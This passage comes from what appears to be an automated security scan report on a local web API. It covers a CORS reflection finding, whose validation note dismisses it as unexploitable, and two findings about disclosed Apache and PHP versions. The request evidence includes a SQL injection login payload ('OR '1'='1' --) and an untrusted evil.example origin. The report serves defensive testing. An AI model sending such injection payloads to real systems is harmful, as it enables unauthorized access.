Allow only explicitly trusted origins, omit credential support if it is not needed, and reject unrecognized origins. Keep authentication and authorization checks independent of CORS.

### Evidence
```
A GET request to `/api/admin/customers/2` with `Origin: https://evil.example` returned HTTP 200 with `Access-Control-Allow-Origin: https://evil.example` and `Access-Control-Allow-Credentials: true`. The response exposed a customer record and account details.
```

### Request Evidence
```
The request used the authenticated admin session and an untrusted Origin header.
```

### Response Evidence
```
The response exposed a customer record and account details while reflecting the attacker-controlled origin and allowing credentials.
```

### Validation Note
The endpoint does reflect https://evil.example and sets Access-Control-Allow-Credentials, but the customer response is available only when an explicit Authorization header is supplied. The anonymous request with the same Origin returned 401 with “Missing or invalid Authorization header,” while the successful admin request evidence shows Authorization present and Cookies: none. That is a concrete benign explanation for the claimed cross-origin data exposure: a hostile webpage does not receive or automatically send the API's bearer token, so the reflected CORS headers do not let it read this record by themselves.

## 23. Server software versions disclosed

- Finding reference: RIAG-020
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/admin/auth/login
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
Response headers disclose Apache `2.4.68` and PHP `8.4.25` versions.

### Impact
The version details give attackers information that may help them select targeted checks; no vulnerable component or exploit was demonstrated.

### Likelihood
The versions are directly visible to any client receiving the response.

### Recommendation
Remove or normalize the `Server` and `X-Powered-By` headers, and keep the server components patched.

### Evidence
```
The response headers disclose `server: Apache/2.4.68 (Unix)` and `x-powered-by: PHP/8.4.25`.

REQUEST:
POST http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: none
Cookies: none
{}
{"username": "' OR '1'='1' -- ", "password": "not-a-password"}

RESPONSE:
Status: 401
date: Tue, 22 Sep 2026 23:58:57 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 98
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INVALID_CREDENTIALS","message":"Invalid username or password."}}
```

### Request Evidence
```
POST http://localhost:8081/api/admin/auth/login
use_session: anonymous  Authorization: none
Cookies: none
{}
{"username": "' OR '1'='1' -- ", "password": "not-a-password"}
```

### Response Evidence
```
Status: 401
date: Tue, 22 Sep 2026 23:58:57 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 98
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":false,"error":{"code":"INVALID_CREDENTIALS","message":"Invalid username or password."}}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.

## 24. Server software versions disclosed

- Finding reference: RIAG-021
- Severity: info
- OWASP: A05
- Source: Dynamic
- Validation: skipped
- Affected URL: http://localhost:8081/api/auth/register
- CVSS: 0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N)

### Description
The registration response identifies Apache/2.4.68 and PHP/8.4.25 in its Server and X-Powered-By headers.

### Impact
This gives attackers version details for reconnaissance; the probe does not show an exploitable version-specific weakness.

### Likelihood
Anyone who can reach the registration endpoint can read these headers.

### Recommendation
Suppress or normalize the Server header and remove X-Powered-By. Keep the server and runtime patched.

### Evidence
```
The registration response headers disclose `server: Apache/2.4.68 (Unix)` and `x-powered-by: PHP/8.4.25`.

REQUEST:
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: none
Cookies: none
{"Content-Type": "application/json"}
{"first_name": "Otp", "last_name": "Test", "email": "aespa.otp.923@example.test", "password": "SafeTestPass123!"}

RESPONSE:
Status: 201
date: Tue, 22 Sep 2026 23:22:58 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 588
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"user":{"id":25,"email":"aespa.otp.923@example.test","first_name":"Otp","last_name":"Test","address_line1":null,"address_line2":null,"suburb":null,"state":null,"postcode":null,"phone":null,"avatar_url":null,"totp_enabled":false,"password_hash":"6dffd4f2d5c66e40469390aa5e5fbb71","totp_secret":null},"token":"[REDACTED_JWT]"},"message":"Registration successful"}
```

### Request Evidence
```
POST http://localhost:8081/api/auth/register
use_session: anonymous  Authorization: none
Cookies: none
{"Content-Type": "application/json"}
{"first_name": "Otp", "last_name": "Test", "email": "aespa.otp.923@example.test", "password": "SafeTestPass123!"}
```

### Response Evidence
```
Status: 201
date: Tue, 22 Sep 2026 23:22:58 GMT
server: Apache/2.4.68 (Unix)
x-powered-by: PHP/8.4.25
access-control-allow-origin: *
access-control-allow-credentials: true
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD
access-control-allow-headers: *
access-control-max-age: 86400
content-length: 588
keep-alive: timeout=5, max=100
connection: Keep-Alive
content-type: application/json; charset=utf-8

{"success":true,"data":{"user":{"id":25,"email":"aespa.otp.923@example.test","first_name":"Otp","last_name":"Test","address_line1":null,"address_line2":null,"suburb":null,"state":null,"postcode":null,"phone":null,"avatar_url":null,"totp_enabled":false,"password_hash":"6dffd4f2d5c66e40469390aa5e5fbb71","totp_secret":null},"token":"[REDACTED_JWT]"},"message":"Registration successful"}
```

### Validation Note
Not validated: severity 'info' is below the configured threshold 'low'.
